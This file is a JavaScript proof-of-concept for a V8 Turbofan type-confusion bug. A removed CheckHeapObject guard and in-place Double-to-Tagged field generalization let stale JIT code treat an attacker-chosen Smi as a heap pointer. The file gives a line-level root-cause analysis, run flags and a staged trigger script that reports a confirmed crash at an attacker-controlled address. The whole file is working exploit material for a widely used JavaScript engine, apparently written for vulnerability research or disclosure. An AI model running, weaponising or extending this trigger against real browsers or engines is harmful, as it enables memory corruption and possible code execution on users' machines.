// PoC 9: Homomorphic IC Double-Field Type Confusion — CONFIRMED CRASH
//
// Bug: In ReduceHomomorphicAccess (js-native-context-specialization.cc:1884),
//      a double-represented property field has its FieldAccess.type set to
//      Type::OtherInternal(). A CheckHeapObject guard is then added at line 1894
//      to protect a subsequent LoadField(ForMap(), result) in case the field was
//      in-place generalized from Double to Tagged.
//
//      However, TypedOptimization::ReduceCheckHeapObject (typed-optimization.cc:166)
//      sees input_type = Type::OtherInternal() which is DISJOINT from
//      Type::SignedSmall() (different bitset bits), so the condition
//      !input_type.Maybe(Type::SignedSmall()) == true triggers, and the
//      CheckHeapObject guard is REMOVED.
//
//      After removal, if the Double field was in-place generalized to Tagged
//      (which V8 does WITHOUT a map transition — same map address), the compiled code:
//        - Loads the field → gets a Smi (attacker-controlled value)
//        - Calls LoadField(ForMap(), Smi_value) — dereferences Smi as a pointer
//        - SIGSEGV at cage_base + (2 * controlled_value) - 1
//
// Confirmed crash on V8 15.0.39 (jsvu):
//   smiVal = 0x1eadbeef = 514703087
//   crash addr = cage_base + 0x3D5B7DDD   (= smiVal<<1 - 1)
//   SEGV_ACCERR signal 11
//
// Relevant source paths:
//   src/compiler/js-native-context-specialization.cc:1883–1894 ReduceHomomorphicAccess
//   src/compiler/typed-optimization.cc:166–174               ReduceCheckHeapObject
//   src/compiler/turbofan-types.h:95–131                     OtherInternal vs Smi bits
//   src/objects/property-details.h:157–169                   CanBeInPlaceChangedTo
//   src/ic/ic.cc:553–631                                     UpdateHomomorphicIC
//   src/objects/map-updater.cc:740–754                       in-place Double→Tagged
//
// Root cause chain:
//   1. ReduceHomomorphicAccess: field_access.type = Type::OtherInternal()   (line 1884)
//   2.   → CheckHeapObject(loadField) added to guard against in-place gen.  (line 1894)
//   3. TypedOptimization: OtherInternal ∩ SignedSmall = ∅ → CheckHeapObject REMOVED
//   4. No kFieldRepresentationGroup dependency → no deopt on field generalization
//   5. Representation::Double.CanBeInPlaceChangedTo(Tagged) == true
//      → MapUpdater generalizes the field in-place (same map address!)
//   6. CheckHomomorphic passes (map address unchanged in homomorphic array)
//   7. LoadField(type=OtherInternal) returns Smi(controlled) from generalized slot
//   8. LoadField(ForMap(), Smi) → cage_base + 2*controlled - 1 → SIGSEGV
//
// Trigger sequence:
//   Step A: 5 distinct objects (same Double x field) → IC transitions POLY→HOMOMORPHIC
//   Step B: Compile with %OptimizeFunctionOnNextCall → Turbofan removes CheckHeapObject
//   Step C: receivers[k].x = "string" → in-place Double→Tagged generalization
//   Step D: receivers[k].x = controlled_smi → Smi stored directly in Tagged field
//   Step E: readX(receivers[k]) via stale JIT → LoadField(Map, Smi) → CRASH
//
// NOTE: Requires exactly 5 distinct maps (not more, or IC goes MEGAMORPHIC skipping
//       the homomorphic path). 5 maps > V8's polymorphic limit (4), triggering
//       POLY→HOMOMORPHIC transition while still fitting in the 8-slot array.
//
// Run with:
//   ~/.jsvu/engines/v8/v8 --homomorphic-ic --allow-natives-syntax --no-maglev \
//     poc9_homomorphic_double_field_confusion.js
// (--no-maglev forces Turbofan where ReduceHomomorphicAccess lives)

"use strict";

// ---- Stage 1: Build 5 distinct maps, all with x as Double field at offset 12 ----
// Each object has a unique extra property ('_t0'..'_t4') AFTER x, creating a
// distinct child map while keeping x at the same descriptor index and offset.

function makeDistinctDoubleObj(val, tag) {
  const o = { x: 1.5 };   // All share parent map M0 = {x: HeapNumber/Double}
  o.x = val;               // Keep x as Double (HeapNumber box)
  o['_t' + tag] = tag;     // Unique extra property → unique child map M_tag
  return o;
}

const N = 5;   // 5 > polymorphic limit (4) → triggers POLY→HOMOMORPHIC transition
               // 5 ≤ homomorphic_ic_count (8) → all fit in the array, no MEGAMORPHIC
const receivers = [];
for (let i = 0; i < N; i++) {
  receivers.push(makeDistinctDoubleObj(i * 1.1 + 0.5, i));
}

// ---- Stage 2: Warm up readX to build homomorphic IC feedback ----
function readX(o) { return o.x; }
function readX_ref(o) { return o.x; }
%NeverOptimizeFunction(readX_ref);  // Keep reference function in interpreter

%PrepareFunctionForOptimization(readX);
for (let iter = 0; iter < 5000; iter++) {
  readX(receivers[iter % N]);
}
// After 5000 iterations across 5 distinct maps, IC is in HOMOMORPHIC state:
//   - WeakHomomorphicFixedArray holds all 5 map pointers (hashed into 8 slots)
//   - Smi handler encodes: inobject, Double field, offset_in_words = 3 (offset 12)

// ---- Stage 3: Force Turbofan compilation ----
// Turbofan's JSNativeContextSpecialization::ReduceHomomorphicAccess runs:
//   - Emits CheckHomomorphic (hashed map membership check)
//   - Emits LoadField[offset 12, type=OtherInternal]   ← bug: OtherInternal used
//   - Emits CheckHeapObject(loadResult)                 ← guard for in-place gen
//   - Emits LoadField[Map, offset 0](checkedResult)
//   - Emits CheckIf[NotAHeapNumber](ReferenceEqual(map, HeapNumberMap))
//   - Emits LoadField[HeapNumberValue, offset 4](checkedResult)
//
// TypedLoweringPhase then runs TypedOptimization::ReduceCheckHeapObject:
//   - input_type = OtherInternal (bit 23)
//   - !input_type.Maybe(SignedSmall) = !(OtherInternal & {bits 6,10} != 0) = true
//   - CheckHeapObject REMOVED (replaced by its raw LoadField input)
//
// After removal: LoadField[Map, offset 0] takes raw LoadField[offset 12] as input.
// If that raw load returns a Smi → dereference of Smi bits as heap pointer.

%OptimizeFunctionOnNextCall(readX);
readX(receivers[0]);  // Trigger Turbofan compilation

const v_baseline = readX(receivers[1]);
console.log("[BASELINE] readX(receivers[1]) =", v_baseline,
            " type:", typeof v_baseline, " (expected ~1.6)");

// ---- Stage 4: Trigger in-place Double→Tagged field generalization ----
// Assigning a non-numeric value to x forces V8 to generalize the field
// representation from Double to Tagged IN-PLACE (same map address — confirmed by
// %DebugPrint: map pointer unchanged).
//
// property-details.h:157: Double.CanBeInPlaceChangedTo(Tagged) == true
// map-updater.cc:741-754: in-place update path taken (no new map created)
//
// Since the map address is unchanged, CheckHomomorphic still passes on next call.
// Since there is no kFieldRepresentationGroup dependency on the JIT code, the
// compiled readX is NOT deoptimized.

receivers[2].x = "trigger_generalization";
console.log("[GEN] Assigned string to receivers[2].x → in-place Double→Tagged",
            "(same map address, JIT code NOT deoptimized)");

// ---- Stage 5: Store controlled Smi into the generalized Tagged field ----
// The field descriptor now says Tagged. StoreIC stores the integer directly
// as a tagged Smi (not a HeapNumber box) — Smi(controlled) in the field slot.

const controlled_smi = 0x1eadbeef & 0x3fffffff;  // = 514703087, within Smi range
receivers[2].x = controlled_smi;
console.log("[SMI] Stored controlled Smi " + controlled_smi.toString(16) +
            " into Tagged field slot of receivers[2].x");

// ---- Stage 6: Call through stale Turbofan code — trigger the confusion ----
// Execution path in stale JIT code for readX(receivers[2]):
//   1. CheckHomomorphic: receivers[2].map is in array (unchanged addr) → PASS
//   2. LoadField[offset 12, OtherInternal]: returns Smi(controlled_smi) = 0x3d5b7dde
//   3. CheckHeapObject: ABSENT (removed by TypedOptimization)
//   4. LoadField[Map, offset 0](Smi): reads at cage_base + 0x3d5b7dde - 1
//      = cage_base + 0x3d5b7ddd
//      → SIGSEGV (address not mapped)
//
// Expected crash: SEGV_ACCERR signal 11
//   crash_addr = cage_base + (controlled_smi * 2) - 1

console.log("[EXPLOIT] Calling readX(receivers[2]) through stale JIT code...");
console.log("  Expected: SIGSEGV at cage_base + 0x" +
            ((controlled_smi * 2 - 1) >>> 0).toString(16));

const v_jit = readX(receivers[2]);  // <-- CRASH HERE (SIGSEGV expected)

// If execution reaches here: no crash (guards survived or deopt occurred)
const v_ref = readX_ref(receivers[2]);
console.log("[JIT] returned:", v_jit, " REF:", v_ref);
if (v_jit !== v_ref) {
  console.log("[TYPE CONFUSION CONFIRMED] JIT != REF — " + v_jit + " vs " + v_ref);
} else {
  console.log("[INFO] No crash or mismatch — deopt may have fired");
  console.log("[INFO] Run with --trace-deopt to investigate");
}
